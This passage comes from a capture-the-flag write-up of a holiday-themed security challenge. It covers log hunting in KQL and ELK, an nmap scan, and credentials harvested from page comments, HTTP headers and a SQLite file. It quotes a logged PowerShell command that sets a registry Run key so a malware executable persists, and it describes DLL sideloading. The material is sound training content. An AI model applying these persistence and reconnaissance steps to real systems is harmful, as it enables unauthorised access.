"process_commandline": New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MS SQL Writer" -Force | New-ItemProperty -Name "frosty" -Value "C:\Windows\Tasks\sqlwriter.exe" -PropertyType String -Force,
"process_name": powershell.exe,
"process_hash": b2bdf6438ab4329448e06b53f5acbbaa28f19c5d1f7d4107a1292c0366eed643,
"hostname": Elf-Lap-A-Boetie,
"username": noboetie
```

```txt
sqlwriter.exe
```

### Question 10

In the previous question, we discovered that two files, sqlwriter.exe and frost.dll, were downloaded onto Noel’s laptop. Immediately after, a registry key was added that ensures sqlwriter.exe will run every time Noel’s computer boots.

This persistence mechanism indicates the attacker’s intent to maintain long-term control over the system.

Eve Snowshoes, "Adding a registry key for persistence is a classic move by attackers to ensure their malicious software runs automatically. It’s crucial to understand how this persistence is set up to prevent further damage."

What is the name of the property assigned to the new registry key?

```sql
ProcessEvents
| where hostname == "Elf-Lap-A-Boetie"
```

```json
"timestamp": 2024-12-24T18:40:36.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MS SQL Writer" -Force | New-ItemProperty -Name "frosty" -Value "C:\Windows\Tasks\sqlwriter.exe" -PropertyType String -Force,
"process_name": powershell.exe,
"process_hash": b2bdf6438ab4329448e06b53f5acbbaa28f19c5d1f7d4107a1292c0366eed643,
"hostname": Elf-Lap-A-Boetie,
"username": noboetie
```

```txt
frosty
```

### Question 11

Congratulations! You've successfully identified the threat actor's tactics. The attacker gained access to WebApp-ElvesWorkshop from the IP address 182.56.23.122, dumped credentials, and used those to send phishing emails internally to Noel.

The malware family they used is called Wineloader, which employs a technique known as DLL sideloading. This technique works by placing a malicious DLL in the same directory as a legitimate executable (in this case, sqlwriter.exe).

When Windows tries to load a referenced DLL without a full path, it checks the executable's current directory first, causing the malicious DLL to load automatically. Additionally, the attacker created a scheduled task to ensure sqlwriter.exe runs on system boot, allowing the malicious DLL to maintain persistence on the system.

To obtain your FINAL flag use the KQL below with your last answer!

```sql
let finalflag = "Change This!";
let base64_encoded = base64_encode_tostring(finalflag);
print base64_encoded
```

```sql
let finalflag = "frosty";
let base64_encoded = base64_encode_tostring(finalflag);
print base64_encoded
```

```txt
ZnJvc3R5
```

## Act II Conclusion

> Both sides want to see Christmas mission fulfilled. Will either yield? Who can 
> bring order to such chaos?

# Act III

I've had a few experiences with ransomware. But, I've never been able to do much
apart from restore from a clean backup. So, we'll have to see how this goes.

> Now Wombley's gone and gotten the Naughty-Nice list ransomwared! Santa is not 
> pleased...
> 
> Maybe Fitzy, Ribb, and Tangle can help mend the situation.

We are met in Act III by Santa within the DMZ. Here is the dialog we are given.
In a nutshell. Santa isn't too happy about what's going on and needs a minute.

> My eyes must be deceiving me. I cannot believe what I am seeing! The North Pole 
> in shambles, a civil war brewing amongst the elves, and the Naughty-Nice List 
> locked away behind ransomware!
>
> You know me, I am the face of jolly. But today... jolly is getting thrown out 
> the castle window! These elves have made my face as red as my hat with rage! 
> It's a good thing I took that distress call seriously.
> 
> I was away for the last few weeks because I was on Planet Frost to ensure Jack 
> Frost received proper justice—neither too harsh nor too lenient—for his crimes 
> last year, and you elves start acting like trolls?
> 
> Is this your true nature? Are you all just Frostian trolls under those pointy 
> ears and rosy cheeks? Wombley, I thought you were more insightful than this. 
> And Alabaster, I thought you more wise.
> 
> And the rest of you, you are all one people, one family. How could you listen 
> to these two knuckleheads and turn on each other so easily? You should all be 
> ashamed of yourselves! You should be in court on Planet Frost with Jack!
> 
> I am so disappointed in all of you. We will decide on repercussions later. 
> For now, you all need to clean this place up, stop broadcasting propaganda, 
> and get the Naughty-Nice List unlocked before you ruin the holidays for the 
> whole world!
>
> ...Oh, hello there, and sorry you had to hear all that. I apologize for the 
> state of the North Pole. I'll be sure you receive a wonderful gift if you 
> could please assist these troublemakers in restoring operations. Thank you. 
> Please excuse me and allow me a moment to collect myself... ahem...
> 
> -- **Santa (Front Yard (Act III))**

## Santa Vision

Alabaster and Wombley have poisoned the Santa Vision feeds! Knock them out to restore everyone back to their regularly scheduled programming.

### Santa Vision A (Silver)

> What username logs you into the SantaVision portal?

The IP addresss we need to start assessing is `35.226.138.216`. So I decided to
start off with an `nmap(1)` scan on all TCP ports with the `-sV` (version) scan
flag.

```sh
sudo nmap -p 0-65535 -sV 35.226.138.216
```

```sh
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-06 00:09 -0600
Nmap scan report for 216.138.226.35.bc.googleusercontent.com (35.226.138.216)
Host is up (0.029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
1883/tcp open     mqtt
5355/tcp filtered llmnr
8000/tcp open     http        Gunicorn
9001/tcp open     tor-orport?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9001-TCP:V=7.98%I=7%D=11/6%Time=690C3BBC%P=x86_64-pc-linux-gnu%r(SS
SF:LSessionReq,F5,"HTTP/1\.0\x20403\x20Forbidden\r\ncontent-type:\x20text/
SF:html\r\ncontent-length:\x20173\r\n\r\n<html><head><meta\x20charset=utf-
SF:8\x20http-equiv=\"Content-Language\"\x20content=\"en\"/><link\x20rel=\"
SF:stylesheet\"\x20type=\"text/css\"\x20href=\"/error\.css\"/></head><body
SF:><h1>403</h1></body></html>")%r(SSLv23SessionReq,F5,"HTTP/1\.0\x20403\x
SF:20Forbidden\r\ncontent-type:\x20text/html\r\ncontent-length:\x20173\r\n
SF:\r\n<html><head><meta\x20charset=utf-8\x20http-equiv=\"Content-Language
SF:\"\x20content=\"en\"/><link\x20rel=\"stylesheet\"\x20type=\"text/css\"\
SF:x20href=\"/error\.css\"/></head><body><h1>403</h1></body></html>")%r(Ja
SF:vaRMI,F5,"HTTP/1\.0\x20403\x20Forbidden\r\ncontent-type:\x20text/html\r
SF:\ncontent-length:\x20173\r\n\r\n<html><head><meta\x20charset=utf-8\x20h
SF:ttp-equiv=\"Content-Language\"\x20content=\"en\"/><link\x20rel=\"styles
SF:heet\"\x20type=\"text/css\"\x20href=\"/error\.css\"/></head><body><h1>4
SF:03</h1></body></html>")%r(Radmin,F5,"HTTP/1\.0\x20403\x20Forbidden\r\nc
SF:ontent-type:\x20text/html\r\ncontent-length:\x20173\r\n\r\n<html><head>
SF:<meta\x20charset=utf-8\x20http-equiv=\"Content-Language\"\x20content=\"
SF:en\"/><link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20href=\"/error
SF:\.css\"/></head><body><h1>403</h1></body></html>")%r(mongodb,F5,"HTTP/1
SF:\.0\x20403\x20Forbidden\r\ncontent-type:\x20text/html\r\ncontent-length
SF::\x20173\r\n\r\n<html><head><meta\x20charset=utf-8\x20http-equiv=\"Cont
SF:ent-Language\"\x20content=\"en\"/><link\x20rel=\"stylesheet\"\x20type=\
SF:"text/css\"\x20href=\"/error\.css\"/></head><body><h1>403</h1></body></
SF:html>")%r(tarantool,F5,"HTTP/1\.0\x20403\x20Forbidden\r\ncontent-type:\
SF:x20text/html\r\ncontent-length:\x20173\r\n\r\n<html><head><meta\x20char
SF:set=utf-8\x20http-equiv=\"Content-Language\"\x20content=\"en\"/><link\x
SF:20rel=\"stylesheet\"\x20type=\"text/css\"\x20href=\"/error\.css\"/></he
SF:ad><body><h1>403</h1></body></html>")%r(RPCCheck,F5,"HTTP/1\.0\x20403\x
SF:20Forbidden\r\ncontent-type:\x20text/html\r\ncontent-length:\x20173\r\n
SF:\r\n<html><head><meta\x20charset=utf-8\x20http-equiv=\"Content-Language
SF:\"\x20content=\"en\"/><link\x20rel=\"stylesheet\"\x20type=\"text/css\"\
SF:x20href=\"/error\.css\"/></head><body><h1>403</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.00 seconds
```
```sh
curl -I http://35.226.138.216:8000
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 06 Nov 2025 06:42:43 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2946
Vary: Cookie
Set-Cookie: svCookie=-9Igqb4XbbgsBmgdvsu3JkM_5oJXmxk--QP2QaoQt4s; Expires=Sun, 07 Dec 2025 06:42:43 GMT; HttpOnly; Path=/
```

Looked at the source code for the site and in the footer I found a few things.

First I found what looks like it might be an MQTT channel/topic named
`sitestatus`.

Then it looks like I find a username and password for MQTT in the comments.

- Username: elfanon
- Password: elfanon

```html
<div class="footer" id="footer">
  <b>©2024 Santavision Elventech Co., Ltd. Snow Rights Reserved.<br>(<i>topic 'sitestatus'</i> available.)</b>
</div> <!-- mqtt: elfanon:elfanon -->
```

```sh
mosquitto_sub -h  35.226.138.216 -u elfanon -P elfanon -t sitestatus
Broker Authentication failed: AlabasterS
Broker Authentication as admin succeeded
Broker Authentication failed: AlabasterS
Broker Authentication as superadmin succeeded
Broker Authentication failed: WomblyC
Broker Authentication failed: WomblyC
Broker Authentication failed: WomblyC
Broker Authentication as admin succeeded
Broker Authentication succeeded: AlabasterS
Broker Authentication succeeded: WomblyC
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
Broker Authentication as admin succeeded
Broker Authentication succeeded: AlabasterS
Broker Authentication failed: WomblyC
Broker Authentication succeeded: WomblyC
Broker Authentication succeeded: AlabasterS
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
Broker Authentication as superadmin succeeded
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
Broker Authentication as admin succeeded
Broker Authentication failed: WomblyC
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
Broker Authentication failed: WomblyC
Broker Authentication as superadmin succeeded
Broker Authentication failed: WomblyC
Broker Authentication failed: WomblyC
Broker Authentication succeeded: WomblyC
Broker Authentication failed: WomblyC
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
Broker Authentication succeeded: AlabasterS
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
Broker Authentication failed: AlabasterS
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
Broker Authentication as superadmin succeeded
Broker Authentication failed: AlabasterS
Broker Authentication failed: AlabasterS
Broker Authentication as superadmin succeeded
Broker Authentication as admin succeeded
Broker Authentication succeeded: AlabasterS

```

Answer for this one is below. Found it in the comments of the web page.

```
elfanon
```

Great work! You've taken the first step—nicely done. You're on the silver path and off to a strong start!

You've gained access, but there’s still much more to uncover. Patience and persistence will guide you—silver or gold, you're making progress!

Now that you're in, it’s time to go deeper. We need access to the northpolefeeds. This won't work if you use Wombley or Alabaster’s credentials—find the right user to log in.

-- Ribb Bonbowford (Front Yard (Act III))

### Santa Vision A (Gold)

(Gold hint) Stay curious. Sometimes, the smallest details—often overlooked—hold the keys to the kingdom. Pay close attention to what’s hidden in the source.

-- Ribb Bonbowford (Front Yard (Act III))

What username logs you into the SantaVision portal?

```
sqlite3 SantasTopSecretDB-2024-Z.sqlite
```
```
select * from users;
```
```
1|santaSiteAdmin|S4n+4sr3411yC00Lp455wd|2024-01-23 06:05:29.466071|1
```

```
santaSiteAdmin
```

### Santa Vision B (Silver)

Once logged on, authenticate further without using Wombley's or Alabaster's accounts to see the northpolefeeds on the monitors. What username worked here?

Like a Good Header on Your HTTP?

From: Ribb Bonbowford

Objective: Santa Vision B

Be on the lookout for strange HTTP headers...

HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 06 Nov 2025 08:21:54 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 5370
Cache-Control: public, max-age=0
Pragma: no-cache
Expires: 0
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
BrkrTopic: northpolefeeds
BrkrUser: santashelper2024
BrkrPswd: playerSantaHelperPass6156585340
Vary: Cookie
Set-Cookie: svCookie=71jjTh9ocBtyjtFRiV32S8wgzXgY_MZFGNml15KNRXI; Expires=Sun, 07 Dec 2025 08:21:54 GMT; HttpOnly; Path=/

santashelper2024



### Santa Vision C (Silver)

Using the information available to you in the SantaVision platform, subscribe to the frostbitfeed MQTT topic. Are there any other feeds available? What is the code name for the elves' secret operation?

```
Idemcerybu
```

### Santa Vision D (Silver)

There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the northpolefeeds feed. What type of contraption do you see Santa on?

## Elf Stack

> Greetings! I'm the genius behind the North Pole Elf Stack SIEM. And oh boy, 
> we’ve got a situation on our hands.
> 
> Our system was attacked—Wombley’s faction unleashed their FrostBit ransomware, 
> and it’s caused a digital disaster.
> 
> The logs are a mess, and Wombley’s laptop—the only backup of the Naughty-Nice 
> List—was smashed to pieces.
> 
> Now, it’s all up to you to help me trace the attack vectors and events. We 
> need to figure out how this went down before it’s too late.
> 
> You’ll be using a containerized ELK stack or Linux CLI tools. Sounds like a 
> fun little puzzle, doesn't it?
> 
> Your job is to analyze these logs... think of it as tracking snow tracks but 
> in a digital blizzard.
> 
> If you can find the attack path, maybe we can salvage what’s left and get 
> Santa’s approval.
> 
> Santa’s furious at the faction fighting, and he’s disappointed. We have to 
> make things right.
> 
> So, let’s show these attackers that the North Pole’s defenses are no joke!
> 
> -- **Fitzy Shortstack (Front Yard (Act III))**

There is a lot of output for this challenge. Thought it would be useful to jot
down the documentation provided for `Elf Stack` just for the sake of having it.

I don't include the ELF Stack container setup in this because I walk through how
setup later. I'm just providing this because it gives more context for the
challenge.

> **Elf Stack Help**
> 
> **Description**
> 
> - Help the ElfSOC analysts and test your technical and security skills while 
>   you investigate a malicious attack. You will parse a set of log files to 
>   identify the malicious attack vector and various events within an attack 
>   chain.
> - The log parsing skills emphasized by this challenge can be done with the 
>   provided containerized Elf Stack SIEM, through traditional Linux CLI tools, 
>   or however you want. There are two challenge modes (EASY and HARD) which 
>   determines the difficulty of questions presented to you.
> - Note: You do not have to use the containerized SIEM to solve any of the 
>   questions, but it might make things a bit easier!
> - You can download the containerized Elf Stack SIEM configuration and log 
>   files by selecting the "Download" button.
> 
> **Challenge Modes**
>
> **Easy Mode**
>
> - This mode teaches basic log parsing with a common SIEM utility like the ELK 
>   stack. You are provided a Docker Compose configuration that allows you to 
>   fully setup an ELK stack within a containerized environment.
> - Select this mode if you are new to security, or you want to continue on 
>   with the story. This mode is meant to help you learn while doing.
>
> **Hard Mode**
>
> - This mode expects you have some knowledge on parsing log files. The attack 
>   path is more complex and you will need to research how to identify the 
>   steps within the attack chain.
> - Select this mode if you want to challenge your security skills.


The `sudo(1)` command may be needed for the docker-compose commands depending on
your setup. I couldn't get this to work in `podman-compose` so I needed to
uninstall that and install `docker` and `docker-compose`. Which is no big deal. 

After downloading the files and unzipping them. I went through the setup process
using the following command.

```sh
docker-compose up setup
```

Personally I didn't know this was something you could do and it was done pretty
well. Running this `setup` docker service first gets the `elf_net`, a volume,
and some of the containers for Elastic Search created. 

```sh
[+] Running 2/3
[+] Running 4/4net               Created                                                                                                                                                0.1s
 ✔ Network elf_net               Created                                                                                                                                                0.1s
 ✔ Volume ess_elastisearch_data  Created                                                                                                                                                0.0s
 ✔ Container ess_elasticsearch   Created                                                                                                                                                0.1s
 ✔ Container ess_setup           Recreated                                                                                                                                              0.1s
Attaching to ess_setup
ess_setup  | [+] Waiting for availability of Elasticsearch. This can take several minutes.
ess_setup  |    ⠿ Elasticsearch is running
ess_setup  | [+] Waiting for initialization of built-in users
ess_setup  |    ⠿ Built-in users were initialized
ess_setup  | [+] Role 'heartbeat_writer'
ess_setup  |    ⠿ Creating/updating
ess_setup  | [+] Role 'metricbeat_writer'
ess_setup  |    ⠿ Creating/updating
ess_setup  | [+] Role 'filebeat_writer'
ess_setup  |    ⠿ Creating/updating
ess_setup  | [+] Role 'logstash_writer'
ess_setup  |    ⠿ Creating/updating
ess_setup  | [+] User 'filebeat_internal'
ess_setup  |    ⠿ User does not exist, creating
ess_setup  | [+] User 'kibana_system'
ess_setup  |    ⠿ User exists, setting password
ess_setup  | [+] User 'logstash_internal'
ess_setup  |    ⠿ User does not exist, creating
ess_setup  | [+] User 'heartbeat_internal'
ess_setup  |    ⠿ User does not exist, creating
ess_setup  | [+] User 'metricbeat_internal'
ess_setup  |    ⠿ User does not exist, creating
ess_setup  | [+] User 'monitoring_internal'
ess_setup  |    ⠿ User does not exist, creating
ess_setup  | [+] User 'beats_system'
ess_setup  |    ⠿ User exists, setting password
ess_setup exited with code 0
```
Next we bring everything up with the `up` command. Which will begin the process
for building the the ELK - ELF Stack.

```sh
docker compose up
```

This brings up all of the necessary components. Which is pretty impressive
having a local instance of this within a few containers. SANs and Counter Hack
really put in some work on this and it shows.

Speaking of things that I loved about this. Look at that ASCII art! It's great!

So, this will setup the `Elasticsearch`, `Kibana`, and `Logstash` containers.
Along with another container that will aggregate the logs for us after
everything is setup.

Once the logs are ingested. The login information is displayed in the logs as
well.

- URL: http://localhost:5601
- User: elastic
- Password: ELFstackLogin!

Now we should be ready to start working on the questions.

```sh
[+] Running 5/5
 ✔ Volume ess_logstash_queue_data  Created                                                                                                                                              0.0s
 ✔ Container ess_elasticsearch     Running                                                                                                                                              0.0s
 ✔ Container ess_kibana            Created                                                                                                                                              0.1s
 ✔ Container ess_logstash          Created                                                                                                                                              0.1s
 ✔ Container ess_syslog_sender     Created                                                                                                                                              0.1s
Attaching to ess_elasticsearch, ess_kibana, ess_logstash, ess_syslog_sender
ess_logstash  | Using bundled JDK: /usr/share/logstash/jdk
ess_kibana    | Kibana is currently running with legacy OpenSSL providers enabled! For details and instructions on how to disable see https://www.elastic.co/guide/en/kibana/8.15/production.html#openssl-legacy-provider
ess_kibana    | {"log.level":"info","@timestamp":"2025-11-05T04:55:05.143Z","log.logger":"elastic-apm-node","ecs.version":"8.10.0","agentVersion":"4.7.0","env":{"pid":7,"proctitle":"/usr/share/kibana/bin/../node/glibc-217/bin/node","os":"linux 6.17.5-arch1-1","arch":"x64","host":"64731fa98a74","timezone":"UTC+00","runtime":"Node.js v20.15.1"},"config":{"active":{"source":"start","value":true},"breakdownMetrics":{"source":"start","value":false},"captureBody":{"source":"start","value":"off","commonName":"capture_body"},"captureHeaders":{"source":"start","value":false},"centralConfig":{"source":"start","value":false},"contextPropagationOnly":{"source":"start","value":true},"environment":{"source":"start","value":"production"},"globalLabels":{"source":"start","value":[["git_rev","f66ec5b0ddd990d103489c47ca1bcb97dc50bc6b"]],"sourceValue":{"git_rev":"f66ec5b0ddd990d103489c47ca1bcb97dc50bc6b"}},"logLevel":{"source":"default","value":"info","commonName":"log_level"},"metricsInterval":{"source":"start","value":120,"sourceValue":"120s"},"serverUrl":{"source":"start","value":"https://kibana-cloud-apm.apm.us-east-1.aws.found.io/","commonName":"server_url"},"transactionSampleRate":{"source":"start","value":0.1,"commonName":"transaction_sample_rate"},"captureSpanStackTraces":{"source":"start","sourceValue":false},"secretToken":{"source":"start","value":"[REDACTED]","commonName":"secret_token"},"serviceName":{"source":"start","value":"kibana","commonName":"service_name"},"serviceVersion":{"source":"start","value":"8.15.1","commonName":"service_version"}},"activationMethod":"require","message":"Elastic APM Node.js Agent v4.7.0"}
ess_kibana    | Native global console methods have been overridden in production environment.
ess_syslog_sender  | 🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄
ess_syslog_sender  | 🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄
ess_syslog_sender  |
ess_syslog_sender  |   _____  _      _____     ____   _____     _      ____  _  __
ess_syslog_sender  |  | ____|| |    |  ___|   / ___| |_   _|   / \    / ___|| |/ /
ess_syslog_sender  |  |  _|  | |    | |_      \___ \   | |    / _ \  | |    | ' /
ess_syslog_sender  |  | |___ | |___ |  _|      ___) |  | |   / ___ \ | |___ | . \
ess_syslog_sender  |  |_____||_____||_|       |____/   |_|  /_/   \_\ \____||_|\_\
ess_syslog_sender  |
ess_syslog_sender  |   _          _                    _    _
ess_syslog_sender  |  (_) ___    | |__    ___    ___  | |_ (_) _ __    __ _
ess_syslog_sender  |  | |/ __|   | '_ \  / _ \  / _ \ | __|| || '_ \  / _` |
ess_syslog_sender  |  | |\__ \   | |_) || (_) || (_) || |_ | || | | || (_| | _  _  _
ess_syslog_sender  |  |_||___/   |_.__/  \___/  \___/  \__||_||_| |_| \__, |(_)(_)(_)
ess_syslog_sender  |                                                  |___/
ess_syslog_sender  |
ess_syslog_sender  |    ****READY AT APPROXIMATELY: 2025-11-05 05:26:00+00:00 (~20-30 MINUTES)****
ess_syslog_sender  |
ess_syslog_sender  | 🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄
ess_syslog_sender  | 🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄
ess_syslog_sender  | [2025-11-05T04:55:12.133413+00:00] INFO: Elasticsearch is up!
ess_syslog_sender  | [2025-11-05T04:55:12.135715+00:00] INFO: The Logstash connection is not available yet...
ess_syslog_sender  | [2025-11-05T04:55:12.135756+00:00] INFO: Retrying connection to Logstash in 15 seconds...
ess_logstash       | Sending Logstash logs to /usr/share/logstash/logs which is now configured via log4j2.properties
ess_syslog_sender  | [2025-11-05T04:55:27.209720+00:00] INFO: Logstash is up!
ess_syslog_sender  | [2025-11-05T04:55:27.211934+00:00] INFO: The Kibana connection is not available yet...
ess_syslog_sender  | [2025-11-05T04:55:27.211995+00:00] INFO: Retrying connection to Kibana in 15 seconds...
ess_syslog_sender  | [2025-11-05T04:55:42.272550+00:00] INFO: Kibana is up!
ess_syslog_sender  | [2025-11-05T04:55:52.291447+00:00] INFO: Replica settings applied to all indexes.
ess_syslog_sender  | [2025-11-05T04:55:52.494379+00:00] INFO: Index settings updated successfully.
ess_syslog_sender  | [2025-11-05T04:55:53.349617+00:00] INFO: Data View created successfully!
ess_syslog_sender  | [2025-11-05T04:55:53.349989+00:00] INFO: Starting log ingestion for file: /root/log_chunk_1.log
ess_syslog_sender  | [2025-11-05T05:00:21.299152+00:00] INFO: Starting log ingestion for file: /root/log_chunk_2.log
ess_syslog_sender  | [2025-11-05T05:04:49.308823+00:00] INFO: Total number of lines sent across all log files: 2343146.
ess_syslog_sender  | [2025-11-05T05:04:49.308856+00:00] INFO: Total time taken for ingestion: 0:09:37.
ess_syslog_sender  | 🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄
ess_syslog_sender  | 🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄
ess_syslog_sender  |   _____  _      _____     ____   _____     _      ____  _  __
ess_syslog_sender  |  | ____|| |    |  ___|   / ___| |_   _|   / \    / ___|| |/ /
ess_syslog_sender  |  |  _|  | |    | |_      \___ \   | |    / _ \  | |    | ' /
ess_syslog_sender  |  | |___ | |___ |  _|      ___) |  | |   / ___ \ | |___ | . \
ess_syslog_sender  |  |_____||_____||_|       |____/   |_|  /_/   \_\ \____||_|\_\
ess_syslog_sender  |
ess_syslog_sender  |   _                                 _         _
ess_syslog_sender  |  (_) ___     _ __   ___   __ _   __| | _   _ | |
ess_syslog_sender  |  | |/ __|   | '__| / _ \ / _` | / _` || | | || |
ess_syslog_sender  |  | |\__ \   | |   |  __/| (_| || (_| || |_| ||_|
ess_syslog_sender  |  |_||___/   |_|    \___| \__,_| \__,_| \__, |(_)
ess_syslog_sender  |                                        |___/
ess_syslog_sender  |
ess_syslog_sender  | ****************************************
ess_syslog_sender  |    LOGIN INFORMATION:
ess_syslog_sender  |            URL: http://localhost:5601
ess_syslog_sender  |            Username: elastic
ess_syslog_sender  |            Password: ELFstackLogin!
ess_syslog_sender  |
ess_syslog_sender  |            SET DATE IN ANALYSIS: DISCOVER TO 2024
ess_syslog_sender  | ****************************************
ess_syslog_sender  |
ess_syslog_sender  | 🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄
ess_syslog_sender  | 🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄⇇🎄✖🎄✖🎄
ess_syslog_sender  | Finished
ess_syslog_sender exited with code 0
```

**Troubleshooting:**

When shutting down this environment they recommend to use the following command.

```sh
docker-compose down --volumes
```

I also ran into something where I messed this up and Kibana wouldn't load for
whatever reason. It would fail to connect. So, I found a solution. Found that 
I needed to run `setup --force-recreate` so the `elf_net` container network 
would be available in some cases. This will force the service to be rebuilt.
Just a minor troubleshooting tidbit that isn't related to the challenge.

```sh
docker-compose up setup --force-recreate
```

### Question 1

> How many unique values are there for the event_source field in all logs?

To check this I used a bar graph to get the unique sources.

```txt
5
```

### Question 2: 

> Which event_source has the fewest number of events related to it?

Looks like the fewest number of events goes to `AuthLog` at `256` events.

```txt
AuthLog
```

### Question 3: 

> Using the event_source from the previous question as a filter, what is the 
> field name that contains the name of the system the log event originated 
> from?

```sql
event_source: AuthLog
```

```json
{
  "@timestamp": [
    "2024-09-16T16:00:01.000Z"
  ],
  "@version": [
    "1"
  ],
  "data_stream.dataset": [
    "generic"
  ],
  "data_stream.namespace": [
    "default"
  ],
  "data_stream.type": [
    "logs"
  ],
  "event_source": [
    "AuthLog"
  ],
  "event.hostname": [
    "kringleSSleigH"
  ],
  "event.message": [
    "pam_unix(cron:session): session closed for user root"
  ],
  "event.OpcodeDisplayNameText": [
    "Unknown"
  ],
  "event.service": [
    "CRON[6780]:"
  ],
  "event.timestamp": [
    "2024-09-16T19:00:01.353Z"
  ],
  "host.ip": [
    "172.18.0.5"
  ],
  "hostname": [
    "kringleSSleigH"
  ],
  "log.syslog.facility.code": [
    1
  ],
  "log.syslog.facility.name": [
    "user-level"
  ],
  "log.syslog.facility.name.text": [
    "user-level"
  ],
  "log.syslog.severity.code": [
    5
  ],
  "log.syslog.severity.name": [
    "notice"
  ],
  "log.syslog.severity.name.text": [
    "notice"
  ],
  "tags": [
    "match"
  ],
  "type": [
    "syslog"
  ],
  "_id": "35d8ab1086149596cb39a72fe27183092196e8c4",
  "_index": ".ds-logs-generic-default-2025.11.05-000001",
  "_score": null
}
```

```txt
event.hostname
```

### Question 4: 

> Which event_source has the second highest number of events related to it?

The event_source with the second highest number of events related to it would
be `NetflowPmacct` with a count of `34,679`.

```txt
NetflowPmacct
```
### Question 5 

> Using the event_source from the previous question as a filter, what is the 
> name of the field that defines the destination port of the Netflow logs?


```sql
event_source: "NetflowPmacct"
```

```json
{
  "@timestamp": [
    "2024-09-15T14:38:43.000Z"
  ],
  "@version": [
    "1"
  ],
  "data_stream.dataset": [
    "generic"
  ],
  "data_stream.namespace": [
    "default"
  ],
  "data_stream.type": [
    "logs"
  ],
  "event_source": [
    "NetflowPmacct"
  ],
  "event.bytes": [
    41
  ],
  "event.dst_host": [
    ""
  ],
  "event.event_type": [
    "purge"
  ],
  "event.ip_dst": [
    "146.75.81.44"
  ],
  "event.ip_proto": [
    "tcp"
  ],
  "event.ip_src": [
    "172.24.25.20"
  ],
  "event.OpcodeDisplayNameText": [
    "Unknown"
  ],
  "event.packets": [
    1
  ],
  "event.port_dst": [
    443
  ],
  "event.port_src": [
    52218
  ],
  "event.src_host": [
    ""
  ],
  "event.timestamp_end": [
    "0000-00-00T00:00:00-00:00"
  ],
  "event.timestamp_start": [
    "2024-09-15T10:38:43-04:00"
  ],
  "host.ip": [
    "172.18.0.5"
  ],
  "hostname": [
    "kringleconnect"
  ],
  "log.syslog.facility.code": [
    1
  ],
  "log.syslog.facility.name": [
    "user-level"
  ],
  "log.syslog.facility.name.text": [
    "user-level"
  ],
  "log.syslog.severity.code": [
    5
  ],
  "log.syslog.severity.name": [
    "notice"
  ],
